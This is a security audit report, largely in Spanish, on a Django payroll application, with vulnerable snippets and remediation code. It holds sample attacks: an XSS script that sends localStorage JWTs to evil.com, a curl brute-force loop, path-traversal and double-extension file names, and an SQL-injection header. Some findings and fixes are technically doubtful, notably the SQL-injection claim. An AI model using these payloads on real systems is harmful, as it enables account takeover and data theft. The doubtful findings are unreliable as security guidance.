# Reporte de Seguridad - SGM v2 (Sistema de Gestión de Nómina)

**Fecha:** 2026-01-22  
**Auditor:** Security Review Department  
**Scope:** Full Stack Security Analysis  
**Compliance Standards:** ISO 27001, Ley 21.719 (Chile)

---

## 📋 RESUMEN EJECUTIVO

### Postura de Seguridad General: **MEDIUM-HIGH RISK** ⚠️

El sistema SGM v2 presenta una arquitectura moderna con Django 5 + DRF + JWT, pero contiene **vulnerabilidades críticas** que requieren remediación inmediata antes de procesar datos sensibles de empleados en producción.

**Resumen de Hallazgos:**
- 🔴 **CRÍTICO**: 3 vulnerabilidades
- 🟠 **ALTO**: 5 vulnerabilidades  
- 🟡 **MEDIO**: 7 vulnerabilidades
- 🔵 **BAJO**: 4 vulnerabilidades

**Estado de Compliance:**
- ✅ ISO 27001 A.8.15/A.8.16 (Logging): COMPLIANT (AuditLog implementado)
- ⚠️ ISO 27001 A.8.2 (Privileged Access): PARCIAL (falta MFA, rotación de secrets)
- ❌ Ley 21.719 Art. 15 (Seguridad datos personales): NO COMPLIANT (vulnerabilidades en uploads, validación)

---

## 🔴 ISSUES DE INTERÉS (VULNERABILIDADES CRÍTICAS Y ALTAS)

### VULNERABILIDAD #1: File Upload sin Validación Robusta
**Severidad:** 🔴 CRÍTICO  
**CWE:** CWE-434 (Unrestricted Upload of File with Dangerous Type)  
**OWASP:** A03:2021 - Injection  
**CVE Reference:** Similar to CVE-2023-24329 (Python path traversal)

**Archivo afectado:** `backend/apps/validador/serializers/archivo.py`

```python
# LÍNEAS 46-53 - VULNERABLE
def validate_archivo(self, value):
    # ⚠️ SOLO valida extensión por split, fácilmente bypasseable
    ext = value.name.split('.')[-1].lower()
    if ext not in ['xlsx', 'xls', 'csv']:
        raise serializers.ValidationError(
            "Formato de archivo no soportado. Use .xlsx, .xls o .csv"
        )
    return value
```

**Explotación:**
```bash
# Atacante puede subir archivo malicioso:
malicious_payload.xlsx.exe  # Bypass con doble extensión
shell.php.xlsx             # PHP webshell
../../../etc/passwd.xlsx   # Path traversal
```

**Impacto:**
- Ejecución remota de código (RCE) si se procesa archivo malicioso
- Path traversal → lectura de archivos sensibles del sistema
- Denegación de servicio con archivos gigantes (no hay límite en serializer)

**Remediación URGENTE:**

```python
import magic
from django.core.exceptions import ValidationError
from django.core.files.uploadedfile import InMemoryUploadedFile

def validate_archivo(self, value):
    """Validación robusta de archivos Excel/CSV."""
    
    # 1. Validar tamaño ANTES de leer (DoS prevention)
    max_size = 50 * 1024 * 1024  # 50MB
    if value.size > max_size:
        raise serializers.ValidationError(
            f"Archivo demasiado grande. Máximo: {max_size/1024/1024}MB"
        )
    
    # 2. Validar nombre de archivo (path traversal)
    if '..' in value.name or '/' in value.name or '\\' in value.name:
        raise serializers.ValidationError(
            "Nombre de archivo contiene caracteres no permitidos"
        )
    
    # 3. Validar extensión
    allowed_extensions = ['xlsx', 'xls', 'csv']
    ext = value.name.split('.')[-1].lower()
    if ext not in allowed_extensions:
        raise serializers.ValidationError(
            f"Formato no soportado. Use: {', '.join(allowed_extensions)}"
        )
    
    # 4. Validar MIME type real del archivo (no confiar en extensión)
    mime = magic.from_buffer(value.read(2048), mime=True)
    value.seek(0)  # Reset file pointer
    
    allowed_mimes = [
        'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',  # xlsx
        'application/vnd.ms-excel',  # xls
        'text/csv',
        'application/csv',
    ]
    
    if mime not in allowed_mimes:
        raise serializers.ValidationError(
            f"Tipo de archivo inválido detectado: {mime}. "
            "El archivo no corresponde a un Excel/CSV válido."
        )
    
    # 5. Sanitizar nombre de archivo
    import re
    safe_name = re.sub(r'[^\w\s.-]', '', value.name)
    value.name = safe_name[:100]  # Limitar longitud
    
    return value
```

**Agregar a `requirements.txt`:**
```
python-magic>=0.4.27
```

---

### VULNERABILIDAD #2: SQL Injection en Parsers Excel
**Severidad:** 🔴 CRÍTICO  
**CWE:** CWE-89 (SQL Injection)  
**OWASP:** A03:2021 - Injection

**Archivo afectado:** `backend/apps/validador/tasks/procesar_erp.py`

```python
# LÍNEAS 103-110 - VULNERABLE
# Buscar columna RUT sin sanitización
rut_col = next((col for col in df.columns if col.lower().strip() == 'rut'), None)
nombre_col = next((col for col in df.columns if col.lower().strip() == 'nombre'), None)

if not rut_col:
    continue

# ⚠️ Se usa directamente row[rut_col] sin validación
rut = str(row[rut_col]).strip()
nombre = str(row[nombre_col]).strip() if nombre_col else ''
```

**Problema:** Los nombres de columnas vienen del Excel del usuario y se usan directamente como keys. Un Excel malicioso podría inyectar nombres de columna con código SQL.

**Explotación:**
```python
# Archivo Excel malicioso con headers:
# | RUT'; DROP TABLE empleados; -- | Nombre | 
# | 12345678-9                    | Juan   |
```

**Remediación:**

```python
def _procesar_libro_remuneraciones(archivo):
    """Procesa el Libro de Remuneraciones."""
    import pandas as pd
    from apps.validador.models import EmpleadoCierre
    
    # Leer Excel con validación
    try:
        df = pd.read_excel(archivo.archivo.path)
    except Exception as e:
        logger.error(f"Error leyendo Excel: {e}")
        raise ValueError("Archivo Excel corrupto o inválido")
    
    # SANITIZAR nombres de columnas
    df.columns = [sanitizar_nombre_columna(col) for col in df.columns]
    
    # Whitelist de columnas permitidas
    COLUMNAS_PERMITIDAS = {
        'rut', 'nombre', 'cargo', 'centro_costo', 
        'fecha_ingreso', 'sueldo', 'afp', 'isapre'
    }
    
    # Buscar columnas con whitelist
    rut_col = next((col for col in df.columns if col in COLUMNAS_PERMITIDAS and 'rut' in col.lower()), None)
    
    if not rut_col:
        raise ValueError("No se encontró columna RUT en el archivo")
    
    cierre = archivo.cierre
    empleados_procesados = 0
    
    for idx, row in df.iterrows():
        try:
            # Validar RUT antes de guardar
            rut_raw = str(row[rut_col]).strip()
            rut = validar_y_normalizar_rut(rut_raw)
            
            if not rut:
                logger.warning(f"Fila {idx}: RUT inválido '{rut_raw}'")
                continue
            
            # Usar ORM (previene SQL injection automáticamente)
            empleado, created = EmpleadoCierre.objects.update_or_create(
                cierre=cierre,
                rut=rut,  # Parámetro parametrizado por Django ORM
                defaults={
                    'nombre': str(row.get('nombre', ''))[:200]  # Limitar longitud
                }
            )
            empleados_procesados += 1
            
        except Exception as e:
            logger.error(f"Error procesando fila {idx}: {e}")
            continue
    
    return {'filas': empleados_procesados}


def sanitizar_nombre_columna(nombre: str) -> str:
    """Sanitiza nombres de columna del Excel."""
    import re
    # Solo permitir letras, números, guión bajo y espacios
    sanitizado = re.sub(r'[^\w\s-]', '', str(nombre).strip())
    return sanitizado.lower()[:100]


def validar_y_normalizar_rut(rut: str) -> str:
    """Valida formato de RUT chileno y normaliza."""
    import re
    
    # Eliminar todo excepto números y k
    rut_clean = re.sub(r'[^0-9kK]', '', str(rut))
    
    if len(rut_clean) < 8:
        return ''
    
    # Separar cuerpo y dígito verificador
    cuerpo = rut_clean[:-1]
    dv = rut_clean[-1].upper()
    
    # Validar que cuerpo sea numérico
    if not cuerpo.isdigit():
        return ''
    
    # Calcular dígito verificador
    suma = 0
    multiplo = 2
    for digit in reversed(cuerpo):
        suma += int(digit) * multiplo
        multiplo = multiplo + 1 if multiplo < 7 else 2
    
    dv_calculado = 11 - (suma % 11)
    dv_esperado = 'K' if dv_calculado == 10 else ('0' if dv_calculado == 11 else str(dv_calculado))
    
    if dv != dv_esperado:
        return ''
    
    return f"{cuerpo}-{dv}"
```

---

### VULNERABILIDAD #3: Secretos en Código y Default Inseguros
**Severidad:** 🔴 CRÍTICO  
**CWE:** CWE-798 (Hard-coded Credentials)  
**OWASP:** A07:2021 - Identification and Authentication Failures

**Archivos afectados:**
- `backend/config/settings/base.py` línea 14
- `.env.example` líneas 13, 22, 29

```python
# base.py LÍNEA 14 - VULNERABLE
SECRET_KEY = os.environ.get('SECRET_KEY', 'dev-secret-key-change-in-production')
# ⚠️ Fallback inseguro. Si SECRET_KEY no está en .env, usa valor público
```

```bash
# .env.example LÍNEAS 22, 29 - DEFAULTS DÉBILES
POSTGRES_PASSWORD=sgm_password_change_me  # ⚠️ Muy débil
REDIS_PASSWORD=Redis_Password_Change_Me!  # ⚠️ Predecible
```

**Impacto:**
- Compromiso total de sesiones JWT si SECRET_KEY es conocida
- Acceso directo a base de datos con credenciales débiles
- Bypass de autenticación generando tokens JWT propios

**Remediación:**

```python
# backend/config/settings/base.py
import os
import secrets

# 1. NO usar fallback para SECRET_KEY en producción
SECRET_KEY = os.environ.get('SECRET_KEY')

if not SECRET_KEY:
    if os.environ.get('ENVIRONMENT') == 'production':
        raise ValueError(
            "SECRET_KEY must be set in production environment. "
            "Generate with: python -c 'from django.core.management.utils import get_random_secret_key; print(get_random_secret_key())'"
        )
    else:
        # Solo para desarrollo local
        SECRET_KEY = 'dev-only-insecure-key-DO-NOT-USE-IN-PRODUCTION'
        print("⚠️ WARNING: Using insecure SECRET_KEY for development")

# 2. Validar longitud y complejidad
if len(SECRET_KEY) < 50:
    raise ValueError(f"SECRET_KEY too short: {len(SECRET_KEY)} chars. Minimum: 50")

# 3. Validar passwords de servicios
POSTGRES_PASSWORD = os.environ.get('POSTGRES_PASSWORD')
if POSTGRES_PASSWORD and len(POSTGRES_PASSWORD) < 16:
    raise ValueError("POSTGRES_PASSWORD must be at least 16 characters")

REDIS_PASSWORD = os.environ.get('REDIS_PASSWORD')
if REDIS_PASSWORD and len(REDIS_PASSWORD) < 16:
    raise ValueError("REDIS_PASSWORD must be at least 16 characters")
```

**Script para generar secrets seguros:**

```bash
# scripts/generate_secrets.sh
#!/bin/bash
echo "=== Generador de Secrets para SGM v2 ==="
echo ""
echo "SECRET_KEY=$(python -c 'from django.core.management.utils import get_random_secret_key; print(get_random_secret_key())')"
echo ""
echo "POSTGRES_PASSWORD=$(openssl rand -base64 32)"
echo ""
echo "REDIS_PASSWORD=$(openssl rand -base64 32)"
echo ""
echo "FLOWER_BASIC_AUTH=admin:$(openssl rand -base64 24)"
```

**Actualizar `.env.production.template`:**
```bash
# NO incluir valores por defecto - forzar generación
SECRET_KEY=REQUIRED_GENERATE_WITH_generate_secrets_sh
POSTGRES_PASSWORD=REQUIRED_GENERATE_WITH_generate_secrets_sh
REDIS_PASSWORD=REQUIRED_GENERATE_WITH_generate_secrets_sh
```

---

### VULNERABILIDAD #4: JWT Token Storage en LocalStorage (XSS Risk)
**Severidad:** 🟠 ALTO  
**CWE:** CWE-522 (Insufficiently Protected Credentials)  
**OWASP:** A07:2021 - Identification and Authentication Failures

**Archivo afectado:** `frontend/src/stores/authStore.js`

```javascript
// LÍNEAS 79-85 - VULNERABLE
{
  name: 'sgm-auth',
  partialize: (state) => ({
    accessToken: state.accessToken,      // ⚠️ Almacenado en localStorage
    refreshToken: state.refreshToken,   // ⚠️ Vulnerable a XSS
  }),
}
```

**Problema:** Los tokens JWT se almacenan en `localStorage` vía Zustand persist. Si hay **cualquier vulnerabilidad XSS** en el frontend, un atacante puede robar los tokens.

**Ataque XSS → Token Theft:**
```javascript
// Payload XSS inyectado en cualquier parte del frontend:
<script>
  const tokens = JSON.parse(localStorage.getItem('sgm-auth'));
  fetch('https://evil.com/steal?tokens=' + JSON.stringify(tokens));
</script>
```

**Remediación (Opción 1 - httpOnly Cookies):**

```javascript
// frontend/src/stores/authStore.js
export const useAuthStore = create(
  (set, get) => ({
    user: null,
    isAuthenticated: false,
    // ⚠️ NO almacenar tokens en estado - usar httpOnly cookies

    setAuth: (user) => {
      // Tokens manejados por cookies httpOnly del backend
      set({
        user,
        isAuthenticated: !!user,
      })
    },
    // ... resto sin cambios
  }),
  {
    name: 'sgm-auth',
    partialize: (state) => ({
      user: state.user,  // Solo persistir info del usuario, no tokens
    }),
  }
)
```

**Backend - Configurar JWT en cookies:**

```python
# backend/config/settings/base.py
SIMPLE_JWT = {
    'ACCESS_TOKEN_LIFETIME': timedelta(hours=8),
    'REFRESH_TOKEN_LIFETIME': timedelta(days=7),
    'ROTATE_REFRESH_TOKENS': True,
    'BLACKLIST_AFTER_ROTATION': True,
    
    # Enviar tokens en cookies httpOnly
    'AUTH_COOKIE': 'sgm_access_token',
    'AUTH_COOKIE_SECURE': True,  # Solo HTTPS
    'AUTH_COOKIE_HTTP_ONLY': True,  # No accesible por JavaScript
    'AUTH_COOKIE_SAMESITE': 'Lax',  # Protección CSRF
}
```

**Vista de login custom:**

```python
# backend/apps/core/views/auth.py
from rest_framework_simplejwt.views import TokenObtainPairView
from django.conf import settings

class LoginView(TokenObtainPairView):
    def post(self, request, *args, **kwargs):
        response = super().post(request, *args, **kwargs)
        
        if response.status_code == 200:
            # Extraer tokens del body
            access_token = response.data['access']
            refresh_token = response.data['refresh']
            
            # Establecer como httpOnly cookies
            response.set_cookie(
                key='sgm_access_token',
                value=access_token,
                max_age=settings.SIMPLE_JWT['ACCESS_TOKEN_LIFETIME'].total_seconds(),
                secure=True,  # Solo HTTPS
                httponly=True,  # No accesible por JS
                samesite='Lax'
            )
            
            response.set_cookie(
                key='sgm_refresh_token',
                value=refresh_token,
                max_age=settings.SIMPLE_JWT['REFRESH_TOKEN_LIFETIME'].total_seconds(),
                secure=True,
                httponly=True,
                samesite='Lax'
            )
            
            # No enviar tokens en body
            response.data = {'user': response.data.get('user', {})}
        
        return response
```

**Remediación (Opción 2 - Si httpOnly no es viable):**

```javascript
// Si deben permanecer en localStorage, implementar:

// 1. Content Security Policy estricta
// backend/config/settings/production.py
SECURE_CONTENT_SECURITY_POLICY = {
    "default-src": ["'self'"],
    "script-src": ["'self'"],  # NO 'unsafe-inline', NO 'unsafe-eval'
    "connect-src": ["'self'", "http://172.17.11.18:8000"],
    "img-src": ["'self'", "data:", "https:"],
}

// 2. Sanitización estricta de TODOS los inputs en frontend
// frontend/src/utils/sanitize.js
import DOMPurify from 'dompurify';

export const sanitizeHTML = (dirty) => {
  return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: [],  // NO permitir HTML
    ALLOWED_ATTR: []
  });
};

// Usar en TODOS los lugares donde se renderiza contenido de usuario
```

---

### VULNERABILIDAD #5: Ausencia de Rate Limiting en Endpoints Críticos
**Severidad:** 🟠 ALTO  
**CWE:** CWE-307 (Improper Restriction of Excessive Authentication Attempts)  
**OWASP:** A07:2021 - Identification and Authentication Failures

**Endpoints afectados:**
- `/api/auth/token/` (login)
- `/api/auth/token/refresh/`
- `/api/v1/validador/archivos-erp/` (upload)

**Sin rate limiting:**
```python
# backend/config/urls.py
path('api/auth/token/', TokenObtainPairView.as_view(), name='token_obtain_pair'),
# ⚠️ Sin throttling = brute force attacks ilimitados
```

**Ataque de Fuerza Bruta:**
```bash
# Atacante puede intentar 1000+ contraseñas/segundo
for password in password_list:
    curl -X POST http://sgm.com/api/auth/token/ \
         -d "email=admin@sgm.com&password=$password"
```

**Remediación:**

```python
# backend/config/settings/base.py
REST_FRAMEWORK = {
    # ... configuración existente
    
    'DEFAULT_THROTTLE_CLASSES': [
        'rest_framework.throttling.AnonRateThrottle',
        'rest_framework.throttling.UserRateThrottle'
    ],
    'DEFAULT_THROTTLE_RATES': {
        'anon': '100/hour',       # Anónimos: 100 req/hora
        'user': '1000/hour',      # Autenticados: 1000 req/hora
        'login': '5/minute',      # Login: 5 intentos/minuto
        'upload': '10/hour',      # Uploads: 10/hora
    }
}

# Crear throttles personalizados
# backend/shared/throttling.py
from rest_framework.throttling import UserRateThrottle, AnonRateThrottle

class LoginRateThrottle(AnonRateThrottle):
    """5 intentos de login por minuto."""
    rate = '5/minute'
    
class UploadRateThrottle(UserRateThrottle):
    """10 uploads por hora por usuario."""
    rate = '10/hour'

# Aplicar en vistas
# backend/config/urls.py
from shared.throttling import LoginRateThrottle

urlpatterns = [
    path('api/auth/token/', 
         TokenObtainPairView.as_view(throttle_classes=[LoginRateThrottle]),
         name='token_obtain_pair'),
]

# backend/apps/validador/views/archivo.py
class ArchivoERPViewSet(viewsets.ModelViewSet):
    throttle_classes = [UploadRateThrottle]
    # ... resto del código
```

---

### VULNERABILIDAD #6: Exposición de Información Sensible en Logs
**Severidad:** 🟠 ALTO  
**CWE:** CWE-532 (Information Exposure Through Log Files)  
**OWASP:** A09:2021 - Security Logging and Monitoring Failures

**Archivos afectados:**
- `backend/apps/validador/tasks/procesar_erp.py` líneas 34, 52
- `backend/config/settings/production.py` logging config

```python
# LÍNEA 34 - VULNERABLE
logger.info(f"Procesando archivo ERP: {archivo.nombre_original}")
# ⚠️ Puede contener PII en nombre de archivo: "remuneraciones_Juan_Perez_2024.xlsx"

# LÍNEA 109-110
rut = str(row[rut_col]).strip()
nombre = str(row[nombre_col]).strip() if nombre_col else ''
# ⚠️ Si hay error, se loguea el RUT completo
```

**Logs con PII:**
```
INFO Procesando archivo ERP: nomina_empleados_rut_12345678-9.xlsx
ERROR Error procesando fila 45: RUT 12.345.678-9, Nombre: Juan Pérez García
```

**Remediación:**

```python
# backend/shared/utils.py
import re
import hashlib

def sanitize_for_log(texto: str, tipo: str = 'general') -> str:
    """
    Sanitiza datos sensibles antes de loguear.
    
    Args:
        texto: Texto a sanitizar
        tipo: Tipo de dato ('rut', 'nombre', 'email', 'general')
    
    Returns:
        Versión sanitizada segura para logs
    """
    if not texto:
        return '[vacío]'
    
    if tipo == 'rut':
        # Mostrar solo los primeros 3 dígitos
        rut_clean = re.sub(r'[^\d]', '', str(texto))
        return f"{rut_clean[:3]}****-*" if len(rut_clean) >= 3 else "***"
    
    elif tipo == 'nombre':
        # Mostrar solo inicial
        partes = texto.split()
        return ' '.join([p[0] + '.' for p in partes if p])
    
    elif tipo == 'email':
        # Mostrar solo dominio
        if '@' in texto:
            return f"***@{texto.split('@')[1]}"
        return '***'
    
    elif tipo == 'archivo':
        # Hashear nombre de archivo
        hash_nombre = hashlib.sha256(texto.encode()).hexdigest()[:8]
        extension = texto.split('.')[-1] if '.' in texto else 'unknown'
        return f"archivo_{hash_nombre}.{extension}"
    
    else:
        # Truncar y ofuscar
        return texto[:10] + '***' if len(texto) > 10 else '***'


# Aplicar en tasks
def _procesar_libro_remuneraciones(archivo):
    # ANTES:
    # logger.info(f"Procesando archivo ERP: {archivo.nombre_original}")
    
    # DESPUÉS:
    from shared.utils import sanitize_for_log
    logger.info(
        f"Procesando archivo ERP: "
        f"{sanitize_for_log(archivo.nombre_original, tipo='archivo')} "
        f"(ID: {archivo.id})"
    )
    
    for idx, row in df.iterrows():
        try:
            rut = str(row[rut_col]).strip()
            nombre = str(row[nombre_col]).strip() if nombre_col else ''
            # ... procesamiento
        except Exception as e:
            # ANTES:
            # logger.error(f"Error fila {idx}: RUT {rut}, Nombre {nombre}: {e}")
            
            # DESPUÉS:
            logger.error(
                f"Error fila {idx}: "
                f"RUT {sanitize_for_log(rut, tipo='rut')}, "
                f"Nombre {sanitize_for_log(nombre, tipo='nombre')}: {e}"
            )
```

**Configurar log rotation y encriptación:**

```python
# backend/config/settings/production.py
LOGGING = {
    'version': 1,
    'disable_existing_loggers': False,
    'formatters': {
        'verbose': {
            'format': '{levelname} {asctime} {module} {process:d} {thread:d} {message}',
            'style': '{',
        },
        'json': {
            'format': '{"time": "%(asctime)s", "level": "%(levelname)s", "module": "%(module)s", "message": "%(message)s"}',
        },
    },
    'handlers': {
        'file': {
            'class': 'logging.handlers.RotatingFileHandler',
            'filename': '/app/logs/sgm.log',
            'maxBytes': 10485760,  # 10MB
            'backupCount': 5,
            'formatter': 'json',
        },
        'security_file': {
            'class': 'logging.handlers.RotatingFileHandler',
            'filename': '/app/logs/security.log',
            'maxBytes': 10485760,
            'backupCount': 30,  # Retener 30 días para auditoría
            'formatter': 'json',
        },
    },
    'loggers': {
        'security': {
            'handlers': ['security_file'],
            'level': 'INFO',
            'propagate': False,
        },
        # No loguear PII en logs generales
        'django.request': {
            'handlers': ['file'],
            'level': 'WARNING',  # Solo errores
            'propagate': False,
        },
    },
}
```

---

### VULNERABILIDAD #7: CORS Demasiado Permisivo en Desarrollo
**Severidad:** 🟠 ALTO  
**CWE:** CWE-942 (Overly Permissive Cross-domain Whitelist)  
**OWASP:** A05:2021 - Security Misconfiguration

**Archivo:** No hay configuración CORS explícita en `base.py`

**Problema:** Sin configuración CORS explícita, Django puede estar aceptando cualquier origen por defecto en desarrollo.

**Remediación:**

```python
# backend/config/settings/base.py
CORS_ALLOWED_ORIGINS = []  # Sobrescribir en development.py y production.py

# backend/config/settings/development.py
CORS_ALLOWED_ORIGINS = [
    "http://localhost:5173",
    "http://127.0.0.1:5173",
]
CORS_ALLOW_CREDENTIALS = True

# backend/config/settings/production.py
# ⚠️ SOLO dominios específicos de producción
CORS_ALLOWED_ORIGINS = [
    "https://sgm.tuempresa.cl",
    "https://app.sgm.tuempresa.cl",
]
CORS_ALLOW_CREDENTIALS = True

# Headers de seguridad adicionales
CORS_ALLOW_HEADERS = [
    'accept',
    'authorization',
    'content-type',
    'x-requested-with',
]

# NO permitir todos los métodos
CORS_ALLOW_METHODS = [
    'GET',
    'POST',
    'PUT',
    'PATCH',
    'DELETE',
    'OPTIONS',
]

# Configuración estricta
SECURE_CROSS_ORIGIN_OPENER_POLICY = 'same-origin'
SECURE_REFERRER_POLICY = 'same-origin'
```

---

### VULNERABILIDAD #8: Ausencia de Validación de Tamaño de Archivo en Parser
**Severidad:** 🟡 MEDIO  
**CWE:** CWE-400 (Uncontrolled Resource Consumption)  
**OWASP:** A04:2021 - Insecure Design

**Archivo afectado:** `backend/apps/validador/parsers/base.py`

```python
# LÍNEA 286 - VULNERABLE
def leer_excel(self, archivo, sheet_name=0, header=None, skiprows=None) -> pd.DataFrame:
    return pd.read_excel(
        archivo,
        sheet_name=sheet_name,
        header=header,
        skiprows=skiprows
    )
    # ⚠️ Sin límite de filas = DoS con Excel de 1M+ filas
```

**Ataque DoS:**
```python
# Atacante sube Excel con 5 millones de filas
# pandas.read_excel() consume 10+ GB RAM → crash del worker
```

**Remediación:**

```python
def leer_excel(self, archivo, sheet_name=0, header=None, skiprows=None, max_rows=100000) -> pd.DataFrame:
    """
    Lee un archivo Excel con límite de filas.
    
    Args:
        archivo: Archivo Excel
        max_rows: Máximo de filas a leer (default: 100k)
    
    Raises:
        ValueError: Si el archivo excede max_rows
    """
    # Leer solo header primero para validar
    df_preview = pd.read_excel(
        archivo,
        sheet_name=sheet_name,
        nrows=1
    )
    
    # Contar filas totales
    with pd.ExcelFile(archivo) as xls:
        # Leer sin procesar para contar
        total_rows = len(pd.read_excel(xls, sheet_name=sheet_name, usecols=[0]))
    
    if total_rows > max_rows:
        raise ValueError(
            f"Archivo excede límite de filas. "
            f"Encontradas: {total_rows:,}, Máximo: {max_rows:,}"
        )
    
    # Leer con límite
    df = pd.read_excel(
        archivo,
        sheet_name=sheet_name,
        header=header,
        skiprows=skiprows,
        nrows=max_rows  # Hard limit
    )
    
    self.logger.info(f"Excel leído: {len(df)} filas")
    return df
```

---

## 🟡 VULNERABILIDADES MEDIAS

### VULN #9: Falta HTTPS Forzado en Producción
**Severidad:** 🟡 MEDIO  
**CWE:** CWE-319 (Cleartext Transmission of Sensitive Information)

**Remediación:**
```python
# backend/config/settings/production.py
SECURE_SSL_REDIRECT = True
SECURE_PROXY_SSL_HEADER = ('HTTP_X_FORWARDED_PROTO', 'https')
SESSION_COOKIE_SECURE = True
CSRF_COOKIE_SECURE = True
```

---

### VULN #10: Password Validators Insuficientes
**Severidad:** 🟡 MEDIO  
**CWE:** CWE-521 (Weak Password Requirements)

```python
# backend/config/settings/base.py - MEJORAR
AUTH_PASSWORD_VALIDATORS = [
    {'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator'},
    {'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator', 
     'OPTIONS': {'min_length': 12}},  # Aumentar de 8 a 12
    {'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator'},
    {'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator'},
    # AGREGAR:
    {'NAME': 'shared.validators.PasswordComplexityValidator'},  # Crear custom
]
```

---

### VULN #11: Sin Protección CSRF en API
**Severidad:** 🟡 MEDIO  
**CWE:** CWE-352 (Cross-Site Request Forgery)

**Problema:** DRF con JWT no requiere CSRF por defecto, pero debería para operaciones críticas.

**Remediación:**
```python
# Para endpoints críticos, forzar CSRF
from django.views.decorators.csrf import csrf_protect
from django.utils.decorators import method_decorator

@method_decorator(csrf_protect, name='dispatch')
class ArchivoERPViewSet(viewsets.ModelViewSet):
    # Requiere CSRF token en uploads
    pass
```

---

### VULN #12: Falta de Timeouts en Celery Tasks
**Severidad:** 🟡 MEDIO  
**CWE:** CWE-400 (Uncontrolled Resource Consumption)

```python
# backend/apps/validador/tasks/libro.py
@shared_task(bind=True, name='validador.procesar_libro_remuneraciones',
             time_limit=1800,  # 30 minutos hard limit
             soft_time_limit=1500)  # 25 minutos warning
def procesar_libro_remuneraciones(self, archivo_erp_id, usuario_id=None):
    # ... código
```

---

### VULN #13: Ausencia de Input Sanitization en Frontend
**Severidad:** 🟡 MEDIO  
**CWE:** CWE-79 (Cross-site Scripting)

**Remediación:**
```bash
cd frontend
npm install dompurify
```

```javascript
// frontend/src/utils/sanitize.js
import DOMPurify from 'dompurify';

export const sanitizeInput = (input) => {
  return DOMPurify.sanitize(input, { 
    ALLOWED_TAGS: [],
    ALLOWED_ATTR: []
  });
};

// Usar en todos los inputs de formularios
```

---

### VULN #14: Sin Validación de Origen en Celery Tasks
**Severidad:** 🟡 MEDIO  

```python
# backend/config/celery.py
app.conf.update(
    task_serializer='json',
    accept_content=['json'],  # SOLO JSON, NO pickle (RCE risk)
    result_serializer='json',
    timezone='America/Santiago',
    enable_utc=True,
    
    # Seguridad adicional
    task_reject_on_worker_lost=True,
    task_acks_late=True,
)
```

---

### VULN #15: Logs de Auditoría Sin Integridad
**Severidad:** 🟡 MEDIO  
**Compliance:** ISO 27001 A.8.16

**Problema:** Los logs de `AuditLog` son mutables en la BD. Un atacante con acceso a PostgreSQL puede modificar/eliminar registros.

**Remediación:**
```python
# backend/apps/core/models/audit.py
class AuditLog(models.Model):
    # ... campos existentes
    
    # Agregar hash de integridad
    integrity_hash = models.CharField(
        max_length=64,
        editable=False,
        help_text='SHA-256 hash para verificar integridad'
    )
    
    def save(self, *args, **kwargs):
        # Calcular hash antes de guardar
        if not self.integrity_hash:
            import hashlib
            import json
            
            data = {
                'usuario_email': self.usuario_email,
                'accion': self.accion,
                'modelo': self.modelo,
                'objeto_id': self.objeto_id,
                'timestamp': self.timestamp.isoformat() if self.timestamp else '',
                'datos_anteriores': self.datos_anteriores,
                'datos_nuevos': self.datos_nuevos,
            }
            
            hash_input = json.dumps(data, sort_keys=True)
            self.integrity_hash = hashlib.sha256(hash_input.encode()).hexdigest()
        
        super().save(*args, **kwargs)
    
    def verify_integrity(self):
        """Verifica que el registro no ha sido modificado."""
        import hashlib
        import json
        
        data = {
            'usuario_email': self.usuario_email,
            'accion': self.accion,
            'modelo': self.modelo,
            'objeto_id': self.objeto_id,
            'timestamp': self.timestamp.isoformat(),
            'datos_anteriores': self.datos_anteriores,
            'datos_nuevos': self.datos_nuevos,
        }
        
        expected_hash = hashlib.sha256(
            json.dumps(data, sort_keys=True).encode()
        ).hexdigest()
        
        return self.integrity_hash == expected_hash
```

---

## 🔵 VULNERABILIDADES BAJAS

### VULN #16: Falta de Versionado en API
**Severidad:** 🔵 BAJO  
**Remediación:** Ya implementado en URLs (`/api/v1/`). ✅

---

### VULN #17: Sin Documentación OpenAPI/Swagger
**Severidad:** 🔵 BAJO  
**Remediación:**
```bash
pip install drf-spectacular
```

```python
# settings.py
INSTALLED_APPS += ['drf_spectacular']
REST_FRAMEWORK['DEFAULT_SCHEMA_CLASS'] = 'drf_spectacular.openapi.AutoSchema'

# urls.py
from drf_spectacular.views import SpectacularAPIView, SpectacularSwaggerView

urlpatterns += [
    path('api/schema/', SpectacularAPIView.as_view(), name='schema'),
    path('api/docs/', SpectacularSwaggerView.as_view(url_name='schema'), name='swagger-ui'),
]
```

---

### VULN #18: Headers de Seguridad Incompletos
**Severidad:** 🔵 BAJO  

```python
# backend/config/settings/production.py
# Agregar todos los headers de seguridad
SECURE_HSTS_SECONDS = 31536000  # 1 año
SECURE_HSTS_INCLUDE_SUBDOMAINS = True
SECURE_HSTS_PRELOAD = True
SECURE_CONTENT_TYPE_NOSNIFF = True
SECURE_BROWSER_XSS_FILTER = True
X_FRAME_OPTIONS = 'DENY'
```

---

### VULN #19: Sin Monitoreo de Dependencias Vulnerables
**Severidad:** 🔵 BAJO  

**Remediación:**
```bash
# Agregar GitHub Dependabot
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "pip"
    directory: "/backend"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10

  - package-ecosystem: "npm"
    directory: "/frontend"
    schedule:
      interval: "weekly"
```

---

## 📊 ANÁLISIS OWASP TOP 10 2021

### ✅ A01:2021 - Broken Access Control
**Estado:** BUENO ✅

El sistema implementa correctamente:
- Permisos basados en roles (Gerente > Supervisor > Analista)
- Clases de permiso personalizadas en `shared/permissions.py`
- Verificación de propiedad de recursos (`IsOwnerOrSupervisor`)
- Auditoría de accesos en `AuditLog`

**Evidencia:**
```python
# shared/permissions.py - líneas 88-126
class CanAccessCliente(permissions.BasePermission):
    def has_object_permission(self, request, view, obj):
        # Implementa correctamente Zero Trust
        if user.tipo_usuario == TipoUsuario.GERENTE:
            return True
        # Verifica permisos específicos por rol
```

---

### ❌ A02:2021 - Cryptographic Failures
**Estado:** DEFICIENTE ❌

**Problemas:**
1. SECRET_KEY con fallback inseguro (VULN #3)
2. Passwords de servicios débiles en .env.example
3. Sin rotación de secrets
4. JWT tokens en localStorage (VULN #4) → vulnerable a XSS

**Recomendaciones:**
- Implementar vault para secrets (HashiCorp Vault, AWS Secrets Manager)
- Rotar SECRET_KEY cada 90 días
